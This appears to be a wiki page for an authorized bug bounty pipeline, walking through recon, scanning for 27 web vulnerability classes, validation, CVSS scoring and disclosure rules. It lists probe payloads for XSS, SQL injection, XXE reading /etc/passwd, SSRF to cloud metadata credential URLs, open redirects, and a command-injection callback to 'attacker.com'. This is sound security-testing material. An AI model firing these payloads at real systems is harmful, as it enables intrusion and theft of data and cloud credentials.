# 🐛 Ultimate Bug Bounty Pipeline: Complete Master Guide

> [!DANGER]
> **STRICTLY FOR AUTHORIZED BUG BOUNTY PROGRAMS & LAB USE ONLY!**
> Never use against any system without explicit written permission.

[← Pipeline Home](Home.md)

---

## 📋 Table of Contents

1. [[#🎯 Bug Bounty Methodology Lifecycle]]
2. [[#⚙️ Pipeline Setup & Configuration]]
3. [[#🔍 Phase 1 — Reconnaissance & OSINT]]
4. [[#🛡️ Phase 2 — Vulnerability Assessment (30 Scanners)]]
5. [[#💥 Phase 3 — Exploitation & Validation]]
6. [[#📝 Phase 4 — Professional Reporting]]
7. [[#🏆 Platform-Specific Workflows]]
8. [[#📊 CVSS v3.1 Scoring Reference]]
9. [[#⚖️ Legal, Ethics & Disclosure]]
10. [[#🔧 Troubleshooting & FAQ]]

---

# 🎯 Bug Bounty Methodology Lifecycle

```
┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
│  SCOPE   │──▶│  RECON   │──▶│  VULN    │──▶│ EXPLOIT  │──▶│  REPORT  │
│ & Rules  │   │ & OSINT  │   │  SCAN    │   │ & VALID  │   │ & PAYOUT │
└──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘
```

| Phase | What You Do | Pipeline Scripts |
|:------|:------------|:-----------------|
| **1. Scope** | Read program rules, identify in-scope domains/IPs, note exclusions | `config.yaml`, `targets.txt` |
| **2. Recon** | Subdomain enum, directory brute, technology fingerprinting | `01-auto-amass-enum.py`, `07-auto-directory-enum.py` |
| **3. Vuln Scan** | Automated zero-false-positive scanning across 30 vuln classes | Scripts `02`–`30` |
| **4. Exploit** | Validate findings with PoC, confirm impact, document chain | Manual + script validation |
| **5. Report** | Write professional report with CVSS, PoC, remediation | `utils/report_generator.py` |

---

# ⚙️ Pipeline Setup & Configuration

## Prerequisites

| Tool | Required | Install Command |
|:-----|:---------|:----------------|
| Python 3.8+ | ✅ Yes | `apt install python3` or [python.org](https://python.org) |
| pip | ✅ Yes | `apt install python3-pip` |
| PyYAML | ✅ Yes | `pip install pyyaml` |
| requests | ✅ Yes | `pip install requests` |
| psutil | ✅ Yes | `pip install psutil` |
| Go 1.21+ | Optional | For Nuclei/Amass |
| Amass | Optional | `go install github.com/owasp-amass/amass/v4/...@master` |
| Nuclei | Optional | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |

## Quick Start

### Windows
```batch
cd Bug-Bounty-Pipeline
run.bat
```

### Linux/macOS
```bash
cd Bug-Bounty-Pipeline
chmod +x run.sh
./run.sh
```

### Direct Python
```bash
python3 main.py
```

## Configuration

### Step 1: Edit `config.yaml`
```yaml
targets:
  - your-authorized-target.com   # MUST be in-scope!
  - api.your-target.com

report:
  company_name: "Target Corp"
  researcher_name: "Your Handle"
  report_format: html            # html or markdown
  cvss_version: 3.1
```

### Step 2: Edit `targets.txt`
One authorized domain per line:
```
target1.example.com
api.target1.example.com
staging.target1.example.com
```

### Step 3: Interactive Dashboard
Run `python3 main.py` and choose:
```
1. Reconnaissance & OSINT
2. Vulnerability Assessment
3. Exploitation
4. Reporting
5. Run All Scans
6. Install Tools
```

---

# 🔍 Phase 1 — Reconnaissance & OSINT

## 1.1 Passive Subdomain Enumeration

**Script**: `01-auto-amass-enum.py`

```bash
cd scripts
python3 01-auto-amass-enum.py
```

**What it does**:
- Auto-installs Amass if missing
- Runs passive subdomain enumeration using Certificate Transparency logs, DNS records, and web archives
- Outputs discovered subdomains to `01-Recon-OSINT/`

**Manual equivalent**:
```bash
amass enum -passive -d target.com -o subdomains.txt
subfinder -d target.com -all -o subfinder_results.txt
cat subdomains.txt subfinder_results.txt | sort -u > all_subs.txt
```

**Pro Tips**:
- Cross-reference with `crt.sh`: `curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value' | sort -u`
- Check for wildcard DNS: `dig *.target.com`
- Use SecurityTrails API for historical DNS data

## 1.2 Active Directory & File Enumeration

**Script**: `07-auto-directory-enum.py`

```bash
python3 07-auto-directory-enum.py
```

**What it does**:
- Brute-forces directories and files using curated wordlists
- Validates responses (filters false positives from WAF/custom 404 pages)
- Identifies admin panels, backup files, API endpoints

**Key paths to look for**:
| Path Pattern | Why It Matters |
|:-------------|:---------------|
| `/admin`, `/wp-admin` | Admin panel access |
| `/.git/config` | Source code leak |
| `/.env`, `/config.php.bak` | Credential exposure |
| `/api/v1/`, `/graphql` | API endpoints |
| `/swagger.json`, `/openapi.json` | API documentation leak |
| `/.well-known/security.txt` | Security contact info |

## 1.3 Subdomain Takeover Detection

**Script**: `06-zero-false-subdomain-takeover.py`

```bash
python3 06-zero-false-subdomain-takeover.py
```

**What it does**:
- Resolves all discovered subdomains
- Checks CNAME records for dangling references
- Validates against known vulnerable services (GitHub Pages, Heroku, AWS S3, Azure, etc.)
- **Zero false positives**: Only reports if CNAME exists AND target service confirms unclaimed

**Vulnerable CNAME Signatures**:
| Service | CNAME Pattern | Takeover Indicator |
|:--------|:--------------|:-------------------|
| GitHub Pages | `*.github.io` | "There isn't a GitHub Pages site here" |
| Heroku | `*.herokuapp.com` | "No such app" |
| AWS S3 | `*.s3.amazonaws.com` | "NoSuchBucket" |
| Shopify | `*.myshopify.com` | "Sorry, this shop is currently unavailable" |
| Azure | `*.azurewebsites.net` | "404 - Web Site not found" |

---

# 🛡️ Phase 2 — Vulnerability Assessment (31 Scanners)

> [!TIP]
> Every scanner in this pipeline uses **multi-method validation** to achieve zero false positives. A finding is only reported if confirmed by 2+ independent checks.

## OWASP Top 10 2021 Master Scanner

**Script**: `owasp_top10_scanner.py`

This is the ultimate scanner that covers **all 10 OWASP Top 10 2021 categories** in one script:

| OWASP Category | Description |
|:---------------|:------------|
| **A01:2021** | Broken Access Control (exposed admin panels, unauthorized file access) |
| **A02:2021** | Cryptographic Failures (missing HSTS/CSP headers) |
| **A03:2021** | Injection (SQLi, command injection via error-based detection) |
| **A04:2021** | Insecure Design (debug endpoints, missing validation) |
| **A05:2021** | Security Misconfiguration (exposed .git, directory listing) |
| **A06:2021** | Vulnerable and Outdated Components (exposed server headers) |
| **A07:2021** | Identification and Authentication Failures (autocomplete not disabled) |
| **A08:2021** | Software and Data Integrity Failures (exposed dependency files) |
| **A09:2021** | Security Logging and Monitoring Failures (placeholder for lab use) |
| **A10:2021** | Server-Side Request Forgery (SSRF via internal metadata endpoints) |

**Usage**:
```bash
cd scripts
python3 owasp_top10_scanner.py http://your-authorized-target.com
```

**Key Features**:
- **Zero false positives**: Every finding has 2–3 verification steps
- **Control payloads**: Compares responses with safe vs malicious payloads
- **Verification steps logged**: Every finding includes steps to manually confirm
- **Saves findings to**: `owasp_top10_findings.json` with complete audit trail

---

## Vuln Class 01: Cross-Site Scripting (XSS)

**Script**: `02-zero-false-xss.py`

| Attribute | Details |
|:----------|:--------|
| **What** | Inject client-side scripts into web pages viewed by other users |
| **Impact** | Session hijacking, credential theft, defacement, malware distribution |
| **CVSS Range** | 4.3 (Reflected) – 9.0 (Stored + admin context) |

**Detection Method**:
1. Injects reflection payloads: `<script>alert("XSS")</script>`, `<img src=x onerror=alert(1)>`
2. Validates reflection in response body
3. Tests WAF bypass variants to confirm real vulnerability vs filtered reflection

**Manual PoC Template**:
```
URL: https://target.com/search?q=<script>alert(document.domain)</script>
Impact: Reflected XSS allows session hijacking via cookie theft
Steps:
  1. Navigate to search page
  2. Enter payload: <script>alert(document.domain)</script>
  3. Observe JavaScript execution in browser
```

**Remediation**: Output encoding (HTML entity encoding), Content Security Policy headers, input validation

---

## Vuln Class 02: SQL Injection (SQLi)

**Script**: `03-zero-false-sqli.py`

| Attribute | Details |
|:----------|:--------|
| **What** | Inject SQL queries through user input to manipulate database |
| **Impact** | Data breach, authentication bypass, RCE via `xp_cmdshell` |
| **CVSS Range** | 7.5 – 10.0 |

**Detection Method**:
1. Error-based detection: Single quote `'` triggers SQL syntax errors
2. Boolean-based: `' OR 1=1 --` vs `' OR 1=2 --` response difference
3. Time-based: `' OR SLEEP(5) --` causes measurable delay

**Manual PoC Template**:
```
URL: https://target.com/user?id=1' OR 1=1 --
Impact: Boolean-based blind SQLi allows full database extraction
Steps:
  1. Navigate to user profile endpoint
  2. Append SQLi payload to id parameter
  3. Compare response with id=1' OR 1=1 -- vs id=1' OR 1=2 --
  4. Different responses confirm injection point
```

**Remediation**: Parameterized queries (prepared statements), ORM usage, WAF rules, least-privilege DB accounts

---

## Vuln Class 03: Local File Inclusion (LFI)

**Script**: `05-zero-false-lfi.py`

| Attribute | Details |
|:----------|:--------|
| **What** | Include local server files through manipulated file path parameters |
| **Impact** | Source code disclosure, credential theft, RCE via log poisoning |
| **CVSS Range** | 6.5 – 9.8 |

**Detection Method**:
1. Path traversal payloads: `../../../../etc/passwd`
2. Validates response contains known file signatures (`root:x:0:0`)
3. Tests PHP wrapper: `php://filter/convert.base64-encode/resource=index.php`

**Remediation**: Whitelist allowed files, disable `allow_url_include`, chroot jail, input sanitization

---

## Vuln Class 04: Nuclei Template Scanning

**Script**: `04-auto-nuclei-scan.py`

| Attribute | Details |
|:----------|:--------|
| **What** | Template-based vulnerability scanning using 8000+ community templates |
| **Impact** | Detects CVEs, misconfigurations, exposed panels, default credentials |
| **CVSS Range** | Variable per template |

**Usage**:
```bash
python3 04-auto-nuclei-scan.py
# Or manually:
nuclei -u https://target.com -t cves/ -severity critical,high
```

---

## Vuln Class 05: XXE (XML External Entity)

**Script**: `08-zero-false-xxe.py`

| Attribute | Details |
|:----------|:--------|
| **What** | Exploit XML parsers to read files, perform SSRF, or execute commands |
| **Impact** | Internal file read, SSRF to cloud metadata, DoS via billion laughs |
| **CVSS Range** | 7.5 – 9.8 |

**Detection Method**:
1. Sends XML with external entity: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
2. Tests OOB exfiltration via external DTD
3. Validates file content in response

**PoC Payload**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

---

## Vuln Class 06: Command Injection

**Script**: `09-zero-false-command-injection.py`

| Attribute | Details |
|:----------|:--------|
| **What** | Execute OS commands through application input fields |
| **Impact** | Full server compromise, RCE, lateral movement |
| **CVSS Range** | 9.0 – 10.0 |

**Detection Method**:
1. Time-based: `; sleep 5` — measures response delay
2. Output-based: `; id` — checks for command output in response
3. OOB: `; curl attacker.com` — confirms via external callback

**Remediation**: Never pass user input to shell commands, use parameterized APIs, input whitelisting

---

## Vuln Class 07: CSRF (Cross-Site Request Forgery)

**Script**: `10-zero-false-csrf.py`

| Attribute | Details |
|:----------|:--------|
| **What** | Force authenticated users to perform unintended actions |
| **Impact** | Account takeover, unauthorized transactions, settings modification |
| **CVSS Range** | 4.3 – 8.0 |

**Detection Method**:
1. Checks for missing CSRF tokens on state-changing forms
2. Validates `SameSite` cookie attribute absence
3. Tests if token is actually validated server-side

---

## Vuln Class 08: Open Redirect

**Script**: `11-zero-false-open-redirect.py`

| Attribute | Details |
|:----------|:--------|
| **What** | Redirect users to malicious sites via trusted domain |
| **Impact** | Phishing amplification, OAuth token theft, SSO bypass |
| **CVSS Range** | 3.4 – 6.1 |

**Detection Method**:
1. Tests redirect parameters: `?url=https://evil.com`, `?next=//evil.com`
2. Validates actual HTTP 3xx redirect to external domain
3. Tests bypass patterns: `//evil.com`, `/\evil.com`, `%0d%0aLocation: evil.com`

---

## Vuln Class 09: CORS Misconfiguration

**Script**: `12-zero-false-cors.py`

| Attribute | Details |
|:----------|:--------|
| **What** | Overly permissive Cross-Origin Resource Sharing allows data theft |
| **Impact** | Cross-origin data theft, authentication bypass |
| **CVSS Range** | 5.3 – 7.5 |

**Detection Method**:
1. Sends `Origin: https://evil.com` header
2. Checks if `Access-Control-Allow-Origin` reflects attacker origin
3. Validates `Access-Control-Allow-Credentials: true` (critical combo)

---

## Vuln Class 10: SSRF (Server-Side Request Forgery)

**Script**: `13-zero-false-ssrf.py`

| Attribute | Details |
|:----------|:--------|
| **What** | Force server to make requests to internal resources |
| **Impact** | Cloud metadata theft (AWS keys), internal port scanning, RCE |
| **CVSS Range** | 6.5 – 9.8 |

**Detection Method**:
1. Tests URL parameters with internal targets: `http://169.254.169.254/latest/meta-data/`
2. Validates cloud metadata response patterns
3. Tests bypass: `http://0x7f000001`, `http://127.1`, DNS rebinding

**Critical Cloud Metadata URLs**:
| Cloud | URL |
|:------|:----|
| AWS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |

---

## Vuln Class 11: IDOR (Insecure Direct Object Reference)

**Script**: `14-zero-false-idor.py`

| Attribute | Details |
|:----------|:--------|
| **What** | Access other users' data by manipulating object identifiers |
| **Impact** | PII disclosure, account takeover, unauthorized data modification |
| **CVSS Range** | 5.3 – 8.6 |

**Detection Method**:
1. Modifies sequential IDs in API requests (`/api/user/123` → `/api/user/124`)
2. Compares responses to detect unauthorized data access
3. Tests with authenticated vs unauthenticated requests

---

## Vuln Class 12: Clickjacking

**Script**: `15-zero-false-clickjacking.py`

| Attribute | Details |
|:----------|:--------|
| **What** | Trick users into clicking hidden elements via transparent iframes |
| **Impact** | Unauthorized actions (likes, follows, payments) |
| **CVSS Range** | 4.3 – 6.5 |

**Detection**: Checks for missing `X-Frame-Options` and `Content-Security-Policy: frame-ancestors` headers.

---

## Vuln Class 13: Remote File Inclusion (RFI)

**Script**: `16-zero-false-rfi.py` — Includes external files via URL parameters. CVSS: 9.0–9.8.

## Vuln Class 14: Path Traversal

**Script**: `17-zero-false-path-traversal.py` — Directory traversal to read arbitrary files. CVSS: 6.5–9.0.

## Vuln Class 15: Blind SQL Injection

**Script**: `18-zero-false-blind-sqli.py` — Time-based and boolean-based blind SQLi. CVSS: 7.5–9.8.

## Vuln Class 16: NoSQL Injection

**Script**: `19-zero-false-nosqli.py` — MongoDB operator injection (`$gt`, `$ne`). CVSS: 7.5–9.0.

## Vuln Class 17: HTTP Header Injection

**Script**: `20-zero-false-header-injection.py` — Inject headers via CRLF in parameters. CVSS: 5.3–7.5.

## Vuln Class 18: CRLF Injection

**Script**: `21-zero-false-crlf-injection.py` — Inject `\r\n` to manipulate HTTP responses. CVSS: 5.3–7.5.

## Vuln Class 19: File Upload Vulnerabilities

**Script**: `22-zero-false-file-upload.py`

| Attribute | Details |
|:----------|:--------|
| **What** | Upload malicious files (web shells, polyglots) |
| **Impact** | RCE via web shell, stored XSS, DoS |
| **CVSS Range** | 7.5 – 10.0 |

**Detection**: Tests extension filtering bypass (`.php.jpg`, `.phtml`), MIME type validation, content-type manipulation.

## Vuln Class 20: IDOR with UUID

**Script**: `23-zero-false-idor-uuid.py` — IDOR detection even with UUID-based identifiers. CVSS: 5.3–8.0.

## Vuln Class 21: Mass Assignment

**Script**: `24-zero-false-mass-assignment.py` — Add unauthorized fields (`role=admin`) to API requests. CVSS: 6.5–8.0.

## Vuln Class 22: Race Conditions

**Script**: `25-zero-false-race-condition.py` — TOCTOU bugs via parallel requests (coupon reuse, double-spend). CVSS: 5.9–8.1.

## Vuln Class 23: Information Disclosure

**Script**: `26-zero-false-info-disclosure.py` — Stack traces, version headers, debug endpoints, `.git` exposure. CVSS: 3.7–7.5.

## Vuln Class 24: Insecure Deserialization

**Script**: `27-zero-false-insecure-deserialization.py`

| Attribute | Details |
|:----------|:--------|
| **What** | Exploit deserialization of untrusted data for RCE |
| **Impact** | Remote code execution, privilege escalation |
| **CVSS Range** | 8.0 – 10.0 |

**Detection**: Tests Java (ysoserial), Python (pickle), PHP (unserialize) payloads with safe canary markers.

## Vuln Class 25: GraphQL Introspection

**Script**: `28-zero-false-graphql-introspection.py` — Detect enabled introspection queries exposing full API schema. CVSS: 5.3–7.5.

## Vuln Class 26: WebSocket Vulnerabilities

**Script**: `29-zero-false-websocket.py` — Cross-site WebSocket hijacking, missing auth on WS endpoints. CVSS: 5.3–8.0.

## Vuln Class 27: Broken Access Control

**Script**: `30-zero-false-broken-access-control.py` — Horizontal/vertical privilege escalation, missing function-level access control. CVSS: 6.5–9.8.

---

# 💥 Phase 3 — Exploitation & Validation

## Validation Methodology

Every finding MUST be validated before reporting:

```
┌─────────────┐      ┌──────────────┐      ┌─────────────┐
│ Automated   │─────▶│ Manual       │─────▶│ PoC         │
│ Detection   │      │ Confirmation │      │ Screenshot  │
└─────────────┘      └──────────────┘      └─────────────┘
```

| Validation Method | When to Use |
|:------------------|:------------|
| **Response Diff** | Compare response with/without payload (SQLi, XSS) |
| **Time-Based** | Measure delay from `sleep()` or `WAITFOR DELAY` (Blind SQLi, CMDi) |
| **OOB Callback** | Use Burp Collaborator / interactsh for blind SSRF, XXE |
| **Browser Confirm** | Open in real browser for XSS, Clickjacking, CSRF |
| **Impact Demo** | Show actual data extraction, not just error message |

## Full Pipeline Automation

Run all 31 scripts (including OWASP Top 10 master scanner) with maximum efficiency and auto-recovery:
```bash
python3 run-full-pipeline.py
```

Features:
- **Auto-resume prompt**: Asks to resume if previous state exists
- **100% failure resistant**: Auto-saves state continuously, even if Ctrl+C or crash
- **Parallel execution**: Runs independent script groups in parallel for speed
- **5 retries per script**: With AI-powered error auto-fixing
- **Resource monitoring**: Throttles if CPU >90% or RAM >95% (no unnecessary delays!)
- **Script adaptation**: Auto-modifies scripts to follow rules from `rules.yaml`
- **5-minute timeout**: Prevents hanging scripts

---

# 📝 Phase 4 — Professional Reporting

## Report Generation

```bash
cd utils
python3 report_generator.py
```

Generates both HTML and Markdown reports in `04-Reporting/`.

## Report Template (Per Finding)

```markdown
## Finding: [Vulnerability Title]

**Severity**: Critical / High / Medium / Low
**CVSS Score**: X.X (Vector String)
**Endpoint**: https://target.com/vulnerable-endpoint
**Parameter**: `user_input`

### Description
[What the vulnerability is and where it exists]

### Steps to Reproduce
1. Navigate to [URL]
2. Enter payload: [exact payload]
3. Observe [specific behavior]

### Proof of Concept
[Screenshot / HTTP request-response pair]

### Impact
[What an attacker could achieve — data breach, RCE, account takeover]

### Remediation
[Specific fix — parameterized queries, CSP headers, input validation]

### References
- [OWASP Reference](https://owasp.org/...)
- [CWE-XXX](https://cwe.mitre.org/...)
```

## Report Quality Checklist

- [ ] Clear title describing the vulnerability
- [ ] Accurate CVSS v3.1 score with vector string
- [ ] Reproducible steps (another person can follow them)
- [ ] Screenshot or HTTP request/response as proof
- [ ] Real impact statement (not hypothetical)
- [ ] Specific remediation guidance
- [ ] CWE and OWASP references

---

# 🏆 Platform-Specific Workflows

## HackerOne

| Step | Action |
|:-----|:-------|
| 1 | Read program policy & scope carefully |
| 2 | Check for duplicates before submitting |
| 3 | Use their severity calculator for CVSS |
| 4 | Submit clear PoC with reproduction steps |
| 5 | Be patient — triage takes 1-7 days |
| 6 | Respond promptly to analyst questions |

**Payout ranges**: $50–$500 (Low), $500–$2,500 (Medium), $2,500–$15,000 (High), $10,000–$100,000+ (Critical)

## Bugcrowd

| Step | Action |
|:-----|:-------|
| 1 | Check VRT (Vulnerability Rating Taxonomy) for priority |
| 2 | Use their submission form with all required fields |
| 3 | Include environment details (browser, OS, tools) |
| 4 | Mark as `P1`–`P5` based on their priority scale |

## Intigriti

| Step | Action |
|:-----|:-------|
| 1 | Check program for special rules |
| 2 | Submit via their portal with PoC video if possible |
| 3 | Follow up via triage chat if needed |

---

# 📊 CVSS v3.1 Scoring Reference

## Score Ranges

| Rating | Score | Example Vulns |
|:-------|:------|:-------------|
| 🟢 **None** | 0.0 | Informational, best practice suggestions |
| 🔵 **Low** | 0.1–3.9 | Self-XSS, verbose error messages |
| 🟡 **Medium** | 4.0–6.9 | Reflected XSS, CSRF on non-critical functions |
| 🟠 **High** | 7.0–8.9 | Stored XSS in admin, SQLi with limited data |
| 🔴 **Critical** | 9.0–10.0 | RCE, auth bypass, full DB dump, pre-auth SQLi |

## Vector String Components

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (Critical)
```

| Metric | Values |
|:-------|:-------|
| **AV** (Attack Vector) | N=Network, A=Adjacent, L=Local, P=Physical |
| **AC** (Attack Complexity) | L=Low, H=High |
| **PR** (Privileges Required) | N=None, L=Low, H=High |
| **UI** (User Interaction) | N=None, R=Required |
| **S** (Scope) | U=Unchanged, C=Changed |
| **C** (Confidentiality) | N=None, L=Low, H=High |
| **I** (Integrity) | N=None, L=Low, H=High |
| **A** (Availability) | N=None, L=Low, H=High |

---

# ⚖️ Legal, Ethics & Disclosure

## Golden Rules

1. **NEVER test without authorization** — written scope agreement required
2. **Stay in scope** — if `*.target.com` is in scope, `admin.corp.target.com` may NOT be
3. **Don't exfiltrate real data** — prove the bug exists, don't dump the database
4. **Don't DoS production** — use minimal payloads, avoid brute-force on live systems
5. **Report immediately** — don't sit on critical findings
6. **Follow disclosure timelines** — typically 90 days before public disclosure

## Safe Harbor

Most reputable programs include safe harbor clauses protecting researchers who:
- Act in good faith
- Stay within defined scope
- Report findings promptly
- Don't access unnecessary data
- Don't disrupt services

---

# 🔧 Troubleshooting & FAQ

| Issue | Solution |
|:------|:---------|
| **Missing tools** | Run dashboard → "Install Tools" or `python3 utils/auto_tool_installer.py` |
| **Permission denied** | Use `sudo` on Linux; scripts auto-retry with elevated privileges |
| **Python packages missing** | `pip install pyyaml requests psutil` |
| **Pipeline stopped midway** | Re-run same command — it auto-resumes from `.pipeline_state.json` |
| **False positive reported** | All scripts use 2+ validation methods; check manually if unsure |
| **Tool not in PATH** | Update `config.yaml` with full tool paths |
| **Timeout errors** | Increase timeout in `run-full-pipeline.py` (default: 300s) |
| **Check failed scripts** | Inspect `.pipeline_state.json` for error details |

---

> [!WARNING]
> This pipeline is **STRICTLY FOR AUTHORIZED USE ONLY!** Unauthorized testing is illegal and unethical. Always obtain explicit written permission before testing any system.

[← Pipeline Home](Home.md)
